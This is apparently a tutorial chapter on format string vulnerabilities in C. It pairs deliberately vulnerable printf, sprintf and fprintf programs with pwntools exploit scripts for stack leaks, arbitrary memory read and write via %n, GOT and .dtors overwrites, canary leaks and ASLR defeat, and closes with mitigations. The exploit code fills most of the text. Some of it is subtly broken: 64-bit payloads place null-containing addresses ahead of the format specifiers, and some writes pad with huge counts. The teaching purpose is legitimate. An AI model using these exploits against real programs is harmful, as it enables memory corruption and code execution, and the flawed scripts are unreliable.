# Format String Attacks

Format string vulnerabilities occur when user-controlled input is passed directly to format string functions like `printf()`, `sprintf()`, or `fprintf()` without proper validation. These vulnerabilities can lead to information disclosure, memory corruption, and arbitrary code execution.

## Understanding Format Strings

### How Format Strings Work

Format string functions use format specifiers to determine how to interpret and display data:

```c
// Normal usage
printf("Hello %s, you are %d years old\n", name, age);

// Vulnerable usage
printf(user_input);  // DANGEROUS: user controls format string
```

### Format Specifiers

```c
Common Format Specifiers:
%d, %i    - signed integer
%u        - unsigned integer  
%x, %X    - hexadecimal
%o        - octal
%s        - string
%c        - character
%p        - pointer
%n        - write number of chars printed so far
%hn       - write to short
%hhn      - write to char
%ln       - write to long
```

### The Stack and Format Strings

```
Stack Layout During printf():
High Address
┌─────────────────────┐
│   Format String     │ ← 1st argument (RDI)
├─────────────────────┤
│   Argument 1        │ ← 2nd argument (RSI)  
├─────────────────────┤
│   Argument 2        │ ← 3rd argument (RDX)
├─────────────────────┤
│   Argument 3        │ ← 4th argument (RCX)
├─────────────────────┤
│   Stack Arguments   │ ← Additional arguments
│   ...               │
└─────────────────────┘
Low Address
```

## Vulnerable Code Examples

### Basic Format String Bug

```c
// vuln_printf.c
#include <stdio.h>
#include <stdlib.h>

void vulnerable_function() {
    char buffer[256];
    
    printf("Enter input: ");
    fgets(buffer, sizeof(buffer), stdin);
    
    // VULNERABLE: User input used directly as format string
    printf(buffer);
    
    printf("Function completed\n");
}

int main() {
    vulnerable_function();
    return 0;
}
```

**Compilation:**
```bash
# Compile with minimal protections for learning
gcc -fno-stack-protector -no-pie -o vuln_printf vuln_printf.c
```

### sprintf Vulnerability

```c
// vuln_sprintf.c
#include <stdio.h>
#include <string.h>

char global_buffer[1024];

void log_message(char *user_msg) {
    char log_entry[512];
    
    // VULNERABLE: sprintf with user-controlled format
    sprintf(log_entry, user_msg);
    
    strcat(global_buffer, log_entry);
    printf("Logged: %s\n", log_entry);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <message>\n", argv[0]);
        return 1;
    }
    
    log_message(argv[1]);
    return 0;
}
```

### fprintf Vulnerability

```c
// vuln_fprintf.c
#include <stdio.h>

void write_log(char *entry) {
    FILE *logfile = fopen("app.log", "a");
    if (logfile) {
        // VULNERABLE: fprintf with user input as format
        fprintf(logfile, entry);
        fclose(logfile);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) return 1;
    
    write_log(argv[1]);
    printf("Entry logged\n");
    return 0;
}
```

## Exploitation Techniques

### Information Disclosure

```python
#!/usr/bin/env python3
from pwn import *

def stack_reading():
    """Read stack values using format string"""
    
    p = process('./vuln_printf')
    
    # Read first 20 stack values
    payload = b'%p.' * 20
    p.sendline(payload)
    
    # Receive and parse output
    output = p.recvall()
    print("Stack values:")
    
    values = output.split(b'.')
    for i, value in enumerate(values):
        try:
            if value.startswith(b'0x'):
                addr = int(value, 16)
                print(f"Stack[{i}]: 0x{addr:016x}")
        except:
            continue

def read_specific_offset():
    """Read specific stack offset"""
    
    p = process('./vuln_printf')
    
    # Read 6th stack value directly
    payload = b'%6$p'
    p.sendline(payload)
    
    output = p.recvall()
    print(f"6th stack value: {output}")

def read_memory_as_string():
    """Read memory content as string"""
    
    p = process('./vuln_printf')
    
    # Try to read memory at stack locations as strings
    for i in range(1, 10):
        payload = f'%{i}$s'.encode()
        p = process('./vuln_printf')
        p.sendline(payload)
        
        try:
            output = p.recvall(timeout=1)
            if len(output) > 20:  # Found interesting string
                print(f"String at offset {i}: {output}")
        except:
            pass
        
        p.close()

stack_reading()
```

### Finding Format String Offset

```python
#!/usr/bin/env python3
from pwn import *

def find_format_offset():
    """Find the offset where our input appears on stack"""
    
    # Use a unique pattern
    pattern = b'AAAABBBB'
    
    for offset in range(1, 50):
        p = process('./vuln_printf')
        
        # Create payload that reads specific offset as hex
        payload = pattern + f'%{offset}$p'.encode()
        p.sendline(payload)
        
        output = p.recvall()
        
        # Check if our pattern appears in the output
        if b'41414141' in output or b'42424242' in output:
            print(f"Found input at offset: {offset}")
            print(f"Output: {output}")
            break
            
        p.close()

def automated_offset_finding():
    """Automated offset finding with De Bruijn sequence"""
    
    # Generate unique pattern
    pattern = cyclic(64)
    
    p = process('./vuln_printf')
    
    # Send pattern followed by format specifiers
    payload = pattern + b'%p.' * 20
    p.sendline(payload)
    
    output = p.recvall()
    print(f"Output: {output}")
    
    # Parse output to find where our pattern appears
    values = output.split(b'.')
    for i, value in enumerate(values):
        try:
            if value.startswith(b'0x'):
                addr = int(value, 16)
                # Check if this looks like our pattern
                packed = p64(addr)
                if packed in pattern:
                    offset = cyclic_find(packed[:4])
                    print(f"Pattern found at offset {i}, input offset: {offset}")
        except:
            continue

find_format_offset()
```

### Arbitrary Memory Read

```python
#!/usr/bin/env python3
from pwn import *

def read_arbitrary_address(address):
    """Read arbitrary memory address using format string"""
    
    p = process('./vuln_printf')
    
    # Place target address on stack, then read it as string
    payload = p64(address)  # Put address on stack
    payload += b'%8$s'      # Read it as string (adjust offset as needed)
    
    p.sendline(payload)
    
    try:
        output = p.recvall(timeout=2)
        print(f"Memory at 0x{address:x}: {output}")
        return output
    except:
        print(f"Could not read address 0x{address:x}")
        return None
    finally:
        p.close()

def dump_memory_region(start_addr, size):
    """Dump a region of memory"""
    
    print(f"Dumping memory from 0x{start_addr:x} to 0x{start_addr + size:x}")
    
    memory_dump = b''
    
    for offset in range(0, size, 8):  # Read 8 bytes at a time
        addr = start_addr + offset
        data = read_arbitrary_address(addr)
        
        if data:
            # Extract actual memory content (remove printf output formatting)
            # This needs adjustment based on actual output format
            memory_dump += data[:8]  # Adjust based on actual response
    
    return memory_dump

# Example: Read from program's data section
read_arbitrary_address(0x404000)  # Adjust address for your binary
```

### Arbitrary Memory Write

```python
#!/usr/bin/env python3
from pwn import *

def write_arbitrary_value(address, value):
    """Write arbitrary value to arbitrary address using %n"""
    
    p = process('./vuln_printf')
    
    # Method 1: Direct %n write
    # We need to control the number of characters printed before %n
    
    payload = p64(address)  # Target address on stack
    
    # Calculate padding to reach desired value
    chars_needed = value - 8  # Subtract address length
    
    if chars_needed > 0:
        payload += b'A' * chars_needed
    
    payload += b'%8$n'  # Write to address at offset 8 (adjust as needed)
    
    p.sendline(payload)
    output = p.recvall()
    print(f"Attempted to write {value} to 0x{address:x}")
    
    p.close()

def write_large_value(address, value):
    """Write large values using %hn (short writes)"""
    
    # Split large value into smaller parts
    low_word = value & 0xffff
    high_word = (value >> 16) & 0xffff
    
    p = process('./vuln_printf')
    
    # Write low word
    payload = p64(address)      # Target address
    payload += p64(address + 2) # Target address + 2
    
    # Calculate characters needed for low word
    chars_for_low = low_word - 16  # Account for the two addresses
    
    if chars_for_low > 0:
        payload += b'A' * chars_for_low
    
    payload += b'%8$hn'  # Write low word
    
    # Calculate additional characters for high word
    chars_for_high = high_word - low_word
    
    if chars_for_high > 0:
        payload += b'B' * chars_for_high
    
    payload += b'%9$hn'  # Write high word
    
    p.sendline(payload)
    output = p.recvall()
    print(f"Attempted to write 0x{value:x} to 0x{address:x}")
    
    p.close()

def overwrite_return_address():
    """Overwrite return address using format string"""
    
    # First, find the return address on stack
    p = process('./vuln_printf')
    
    # Look for return address pattern
    payload = b'%p.' * 30
    p.sendline(payload)
    
    output = p.recvall()
    print("Stack dump to find return address:")
    print(output)
    
    p.close()
    
    # Once we find the offset, we can overwrite it
    # Example: if return address is at offset 22
    ret_addr_offset = 22
    new_return_addr = 0x401234  # Address we want to jump to
    
    p = process('./vuln_printf')
    
    # Overwrite return address
    payload = f'%{new_return_addr}d%{ret_addr_offset}$n'.encode()
    p.sendline(payload)
    
    # The function should return to our controlled address
    p.interactive()

# Example usage
write_arbitrary_value(0x404080, 0x41414141)
```

### GOT Overwrite Attack

```python
#!/usr/bin/env python3
from pwn import *

def got_overwrite():
    """Overwrite Global Offset Table entries"""
    
    # Load binary to find GOT addresses
    elf = ELF('./vuln_printf')
    
    # Find GOT entry for a function (e.g., printf)
    printf_got = elf.got['printf']
    system_addr = 0x401234  # Address of system() or win function
    
    print(f"printf GOT: 0x{printf_got:x}")
    print(f"Overwriting with: 0x{system_addr:x}")
    
    p = process('./vuln_printf')
    
    # Craft payload to overwrite GOT entry
    payload = p64(printf_got)  # Address to write to
    
    # Calculate characters needed
    chars_needed = system_addr - 8  # Subtract address length
    
    if chars_needed > 0:
        payload += b'A' * chars_needed
    
    payload += b'%8$n'  # Write to GOT entry
    
    p.sendline(payload)
    
    # Next call to printf will actually call system
    p.sendline(b'/bin/sh\x00')
    
    p.interactive()

def precise_got_overwrite():
    """More precise GOT overwrite using multiple writes"""
    
    elf = ELF('./vuln_printf')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Adjust path
    
    # Target function in GOT
    target_got = elf.got['puts']
    system_offset = libc.symbols['system']
    
    # Use multiple %hn writes for precision
    p = process('./vuln_printf')
    
    # Find libc base (requires leak)
    # This is simplified - real attack would need libc leak first
    
    system_addr = 0x7ffff7a52390  # Example system address
    
    # Split address into 16-bit chunks
    low_word = system_addr & 0xffff
    mid_word = (system_addr >> 16) & 0xffff
    high_word = (system_addr >> 32) & 0xffff
    
    payload = p64(target_got)      # +0: low word
    payload += p64(target_got + 2) # +2: mid word  
    payload += p64(target_got + 4) # +4: high word
    
    # Write low word
    payload += f'%{low_word - 24}d%8$hn'.encode()  # Adjust for 3 addresses
    
    # Write mid word
    chars_so_far = low_word
    chars_needed = mid_word - chars_so_far
    if chars_needed < 0:
        chars_needed += 0x10000
    
    payload += f'%{chars_needed}d%9$hn'.encode()
    
    # Write high word
    chars_so_far = mid_word
    chars_needed = high_word - chars_so_far
    if chars_needed < 0:
        chars_needed += 0x10000
    
    payload += f'%{chars_needed}d%10$hn'.encode()
    
    p.sendline(payload)
    
    # Trigger the overwritten function
    p.sendline(b'/bin/sh')
    p.interactive()

got_overwrite()
```

## Advanced Techniques

### DTORS Overwrite

```python
#!/usr/bin/env python3
from pwn import *

def dtors_overwrite():
    """Overwrite destructors table"""
    
    # Find .dtors section
    elf = ELF('./vuln_printf')
    
    # .dtors is typically at a known location
    # This technique is mostly for older binaries
    dtors_addr = 0x8049934  # Example address
    
    win_function = 0x8048484  # Address of win function
    
    p = process('./vuln_printf')
    
    # Overwrite .dtors with win function address
    payload = p32(dtors_addr)
    payload += f'%{win_function - 4}d%8$n'.encode()
    
    p.sendline(payload)
    
    # When program exits, destructors are called
    p.close()  # This should trigger the win function

dtors_overwrite()
```

### Stack Canary Bypass

```python
#!/usr/bin/env python3
from pwn import *

def leak_stack_canary():
    """Leak stack canary using format string"""
    
    p = process('./vuln_printf_canary')  # Binary compiled with canaries
    
    # Stack canaries are typically at predictable offsets
    # Canary usually ends with null byte
    
    payload = b'%p.' * 50  # Dump many stack values
    p.sendline(payload)
    
    output = p.recvall()
    values = output.split(b'.')
    
    for i, value in enumerate(values):
        try:
            if value.startswith(b'0x'):
                addr = int(value, 16)
                # Canary typically has pattern like 0x????????00
                if (addr & 0xff) == 0 and addr > 0x1000000:
                    print(f"Potential canary at offset {i}: 0x{addr:016x}")
        except:
            continue

def bypass_canary_with_leak():
    """Use leaked canary to bypass protection"""
    
    # First leak the canary
    p = process('./vuln_printf_canary')
    
    # Leak canary (adjust offset based on analysis)
    payload = b'%23$p'  # Example offset
    p.sendline(payload)
    
    canary_leak = p.recvline()
    canary = int(canary_leak.strip(), 16)
    print(f"Leaked canary: 0x{canary:016x}")
    
    p.close()
    
    # Now use in buffer overflow
    p = process('./vuln_printf_canary')
    
    # Trigger buffer overflow but preserve canary
    payload = b'A' * 64      # Fill buffer
    payload += p64(canary)   # Restore canary
    payload += b'B' * 8      # Saved RBP
    payload += p64(0x401234) # Return address
    
    p.sendline(payload)
    p.interactive()

leak_stack_canary()
```

### Format String with ASLR

```python
#!/usr/bin/env python3
from pwn import *

def defeat_aslr_with_leaks():
    """Use format string leaks to defeat ASLR"""
    
    p = process('./vuln_printf')
    
    # Leak multiple addresses to determine base addresses
    payload = b'%p.' * 30
    p.sendline(payload)
    
    output = p.recvall()
    values = output.split(b'.')
    
    stack_leak = None
    libc_leak = None
    binary_leak = None
    
    for i, value in enumerate(values):
        try:
            if value.startswith(b'0x'):
                addr = int(value, 16)
                
                # Identify address types by range
                if 0x7fff00000000 <= addr <= 0x7fffffffffff:
                    if not stack_leak:
                        stack_leak = addr
                        print(f"Stack leak: 0x{addr:016x}")
                
                elif 0x7f0000000000 <= addr <= 0x7fffffffffff:
                    if not libc_leak:
                        libc_leak = addr
                        print(f"Libc leak: 0x{addr:016x}")
                
                elif 0x400000 <= addr <= 0x500000:
                    if not binary_leak:
                        binary_leak = addr
                        print(f"Binary leak: 0x{addr:016x}")
        except:
            continue
    
    # Calculate base addresses
    if libc_leak:
        # Calculate libc base (requires knowing offset of leaked function)
        libc_base = libc_leak - 0x29d90  # Example offset to puts
        print(f"Calculated libc base: 0x{libc_base:016x}")
        
        # Now we can calculate gadget addresses
        system_addr = libc_base + 0x52290  # Example offset to system
        print(f"System address: 0x{system_addr:016x}")

defeat_aslr_with_leaks()
```

## Exploitation Framework

```python
#!/usr/bin/env python3
from pwn import *

class FormatStringExploit:
    def __init__(self, binary_path):
        self.binary = binary_path
        self.elf = ELF(binary_path)
        self.offset = None
        
    def find_offset(self):
        """Find format string offset automatically"""
        
        pattern = b'AAAABBBB'
        
        for offset in range(1, 100):
            try:
                p = process(self.binary)
                payload = pattern + f'%{offset}$p'.encode()
                p.sendline(payload)
                
                output = p.recvall(timeout=1)
                
                if b'41414141' in output or b'42424242' in output:
                    self.offset = offset
                    print(f"Found format string offset: {offset}")
                    p.close()
                    return offset
                    
                p.close()
            except:
                continue
        
        print("Could not find format string offset")
        return None
    
    def leak_address(self, stack_offset):
        """Leak address at specific stack offset"""
        
        p = process(self.binary)
        payload = f'%{stack_offset}$p'.encode()
        p.sendline(payload)
        
        output = p.recvall(timeout=1)
        
        try:
            addr = int(output.strip(), 16)
            p.close()
            return addr
        except:
            p.close()
            return None
    
    def arbitrary_read(self, address):
        """Read from arbitrary address"""
        
        if not self.offset:
            self.find_offset()
        
        p = process(self.binary)
        
        payload = p64(address)
        payload += f'%{self.offset}$s'.encode()
        
        p.sendline(payload)
        
        try:
            output = p.recvall(timeout=2)
            p.close()
            # Extract the actual read data
            return output[8:]  # Skip the address we put on stack
        except:
            p.close()
            return None
    
    def arbitrary_write(self, address, value):
        """Write value to arbitrary address"""
        
        if not self.offset:
            self.find_offset()
        
        p = process(self.binary)
        
        payload = p64(address)
        
        chars_needed = value - 8
        if chars_needed > 0:
            payload += b'A' * chars_needed
        
        payload += f'%{self.offset}$n'.encode()
        
        p.sendline(payload)
        output = p.recvall(timeout=1)
        p.close()
        
        return output
    
    def got_overwrite_system(self, target_function):
        """Overwrite GOT entry with system"""
        
        if target_function not in self.elf.got:
            print(f"Function {target_function} not in GOT")
            return False
        
        got_addr = self.elf.got[target_function]
        
        # This is simplified - real implementation needs system address
        system_addr = 0x7ffff7a52390  # Would need to be leaked/calculated
        
        return self.arbitrary_write(got_addr, system_addr)

# Usage example
def exploit_example():
    exploit = FormatStringExploit('./vuln_printf')
    
    # Find offset
    exploit.find_offset()
    
    # Leak some addresses
    leaked_addr = exploit.leak_address(6)
    print(f"Leaked address: 0x{leaked_addr:016x}")
    
    # Read from leaked address
    data = exploit.arbitrary_read(leaked_addr)
    print(f"Data at leaked address: {data}")
    
    # Overwrite GOT (if we had proper addresses)
    # exploit.got_overwrite_system('puts')

exploit_example()
```

## Protection and Mitigation

### Secure Coding Practices

```c
// secure_printf.c - How to avoid format string vulnerabilities

#include <stdio.h>
#include <string.h>

void secure_function(char *user_input) {
    // GOOD: Use format string with user input as argument
    printf("%s", user_input);
    
    // GOOD: Use puts for simple string output
    puts(user_input);
    
    // GOOD: Use fputs for file output
    fputs(user_input, stdout);
}

void secure_logging(char *message) {
    char log_entry[512];
    
    // GOOD: Use snprintf with proper format
    snprintf(log_entry, sizeof(log_entry), "LOG: %s", message);
    
    printf("%s\n", log_entry);
}

// GOOD: Use format string constants
#define LOG_FORMAT "User: %s, Action: %s, Time: %ld\n"

void structured_logging(char *user, char *action, long timestamp) {
    printf(LOG_FORMAT, user, action, timestamp);
}
```

### Compiler Protections

```bash
# Compile with format string protection
gcc -Wformat -Wformat-security -Werror=format-security -o secure vuln.c

# Modern compilers warn about format string issues
gcc -Wall -Wextra -o vuln vuln.c
# Warning: format string is not a string literal
```

### Runtime Protections

```c
// FORTIFY_SOURCE helps detect format string attacks
// Compile with: gcc -D_FORTIFY_SOURCE=2 -O2

#include <stdio.h>

void protected_function(char *input) {
    // Runtime checking will detect direct format string usage
    printf(input);  // This may abort at runtime with FORTIFY_SOURCE
}
```

## Key Takeaways

!!! important "Format String Fundamentals"
    - **User input as format string** is the root cause of vulnerabilities
    - **Stack access** allows reading arbitrary memory locations
    - **%n specifier** enables arbitrary memory writes
    - **GOT overwrites** can redirect program execution
    - **Information leaks** can defeat ASLR and other protections

!!! warning "Common Mistakes"
    - Passing user input directly to printf family functions
    - Not validating format strings in logging functions
    - Assuming format string attacks only read memory
    - Ignoring compiler warnings about format security
    - Using sprintf/fprintf without proper format validation

!!! tip "Exploitation Tips"
    - Find the format string offset first
    - Use %p to leak addresses and defeat ASLR
    - GOT overwrites are often the most reliable attack
    - Combine with other vulnerabilities for full exploitation
    - Practice with different format specifiers and their effects

---

*Next: [Array Indexing Vulnerabilities](02-array-indexing.md)*
